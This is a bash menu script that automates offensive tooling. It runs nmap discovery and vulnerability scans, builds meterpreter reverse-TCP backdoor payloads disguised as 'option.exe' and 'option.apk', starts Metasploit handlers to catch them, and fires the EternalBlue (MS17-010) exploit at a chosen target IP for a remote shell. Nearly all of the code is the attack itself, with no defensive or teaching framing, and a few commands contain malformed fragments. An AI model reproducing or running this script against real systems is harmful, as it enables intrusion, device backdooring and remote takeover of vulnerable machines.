#!/bin/bash
# created by blood1982
MSEL=0;
IP=0;
IP2=0;
PORT=0;

G='\033[0;37m'
H='\033[1;32m'
R='\033[1;31m' 
NC='\033[0m' 

Mnu(){

local OPTIND 
local mnl=0
local slct
local prnt='echo -e "$(expr $i + 1)) ${arg[$i]}"'

	while getopts ":t:m:i" opt
	do
		case $opt in
		t) echo -e "\n[== $OPTARG ==]";;
		m) mnl=1
		slct=$OPTARG;; 
		i) prnt='echo -e "$(expr $i + 1)) ${arg[$i]} [$G$(GetIp ${arg[$i]})$NC]"';;# option ip
		esac
    done
	shift $((OPTIND -1))
	
local arg=("$@")
local carg=${#arg[@]} 
	
	for ((i=0;i<$carg;i++))
	do 	
		eval $prnt
	done
	
	if [ $mnl -eq 1 ]
       	then
		echo "$(expr $i + 1)) $slct"
	fi
	
	read -p "select : " MSEL
}
MnuMnl(){
	echo -e "\n[ $1 ]"
	read -p "Input : " $2
}
ErrSlct(){
	echo -e "$R\nwrong select....\n$NC"
}
LstNet(){

	echo "$(ip -4 addr | grep : | cut -d : -f2 | tr -d " ")"
}
GetIp(){
	echo $(ip addr show $1 | grep -E -o "[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}/" | tr -d "/")
}
CntLn(){
	echo "$1"  | wc -l 
}
SlctLn(){
	echo "$1" | sed -n $2'p'
}
TblIp(){
local ex="Ex:127.0.0.1,localhost.net";
local OPTIND
	while getopts ":n" opt
	do
	case $opt in
     	n) ex="Ex:127.0.0.1,127.0.0.1/24,127.0.0.1-10,localhost.net";;
	esac
    	done
	shift $((OPTIND -1))

	
	Mnu -m "Manual" -i -t "Select IP" $(LstNet)

	if [ $MSEL -le $(CntLn "$(LstNet)") ] && [ $MSEL -ne 0 ] 
	then
		IP=$(GetIp $(SlctLn  "$(LstNet)" $MSEL));
	elif [ $MSEL -eq $(expr $(CntLn "$(LstNet)") + 1) ] 
	then
		MnuMnl $ex IP
	else
		ErrSlct
		exit
	fi 
}
CrNmap(){
case $1 in 
	1) nmap -sV -F --script smb-os-discovery $2 | tee onmap.txt;echo -e "\nresult save : onmap.txt"
	;;
	2) nmap -sV -p- --script vuln $2 | tee onmap.txt;echo -e "\nresult save : onmap.txt"
	;;
	3) MnuMnl "Ex:22 23,50 20-70" PORT
	echo -e "\n"
	nmap -Pn -sV -p $PORT $2 | tee onmap.txt;echo -e "\nresult save : onmap.txt"
	;;
esac

}
CrMsf(){
case $1 in
        Band) msfvenom -p android/meterpreter/reverse_tcp lhost=$2 lport=$3 -f raw -o option.apk;;
        Bwin) msfvenom -p windows/meterpreter/reverse_tcp lhost=$2 lport=$3 -f exe -o option.exe;;
        Ehand) msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set lhost $2;set lport $3;run";;
        Ehwin) msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost $2;set lport $3;run";;
	Etrnlps) msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/shell/reverse_tcp;set lhost $2;set rhost $3;set ;run";;
	Etrnlpm) msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;set payload windows/x64/meterpreter/reverse_tcp;set SessionCommunicationTimeoutset 3000;set lhost $2;set rhost $3;set ;run";;
esac
}
TblNmap(){
local lip
local ip
	
	echo -e "\n***[$H NMAP $NC]***" 
	TblIp -n
	
	if [ $MSEL -le $(CntLn "$(LstNet)") ]
	then
		IP=$IP/24;
	fi
	
	lip=$(nmap $IP -n -sn -oG - | awk '/Up/{print $2}' | tee ip_list.txt)
	echo -e "\nResult save : ip_list.txt\nIP found : $(CntLn "$lip")"
	Mnu -t "Select Ip" -m "all" $lip
	
	if [ $MSEL -eq $( expr $(CntLn "$lip") + 1 ) ]
	then
		ip='-iL ip_list.txt'
	elif [ $MSEL -le $(CntLn "$lip") ] && [ $MSEL -ne 0 ]
	then
		ip=$(SlctLn "$lip" $MSEL)
	else
		ErrSlct
		exit
	fi
	
	Mnu -t "Port Scan" "Fast ( 100 port )" "All ( 65535 port )" "Manual Input"
	echo $ip
	CrNmap $MSEL "$ip"
}

TblMsf(){
local ip
local port
	
	echo -e "\n***[$H MSF $NC]***" 
	Mnu -t "Mode" Backdoor Handler Ms17_010_eternalblue
	case $MSEL in
		1)Mnu -t "Backdoor" Windows Android
			case $MSEL in
				1)TblIp;MnuMnl "Input PORT" PORT;CrMsf Bwin $IP $PORT;;
				2)TblIp;MnuMnl "Input PORT" PORT;CrMsf Band $IP $PORT;;
				*)ErrSlct;exit;;
			esac
		;;
		2)Mnu -t "Handler" Windows Android
			case $MSEL in
				1)TblIp;MnuMnl "Input PORT" PORT;CrMsf Ehwin $IP $PORT;;
				2)TblIp;MnuMnl "Input PORT" PORT;CrMsf Ehand $IP $PORT;;
				*)ErrSlct;exit;;
			esac
		;;
		3)TblIp;MnuMnl "Target ip" IP2;Mnu -t "Payload" Meterpreter shell
			case $MSEL in
				1)CrMsf Etrnlpm $IP $IP2;;
				2)CrMsf Etrnlps $IP $IP2;;
				*)ErrSlct;exit;;
			esac
		;;
		*)ErrSlct;exit;;
	esac

}
MnTbl(){
Mnu -t "Main Menu" Nmap Msf
case $MSEL in
	1)TblNmap;;
	2)TblMsf;;
	*)ErrSlct;exit;;
esac

}
MnTbl
